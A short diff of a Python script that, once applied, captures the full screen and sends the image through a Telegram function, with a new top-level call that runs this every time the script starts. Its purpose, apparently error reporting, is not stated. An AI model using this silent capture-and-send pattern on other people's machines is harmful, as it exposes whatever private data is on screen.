@@ -135,15 +135,14 @@ def send_Image_on_telegram(Image):
         print(e)
 
 def errscreen():
-	pyautogui.screenshot('test.png')
+	import pyscreenshot as ImageGrab
+	im = ImageGrab.grab()
+	im.save("fullscreen.png")
 	time.sleep(3)
-	send_Image_on_telegram('E:/Pyth/jobcode/test.png')
+	send_Image_on_telegram('fullscreen.png')
 	time.sleep(3)
-
-
 		
-		
-		
+errscreen()		
 		
 		
 		
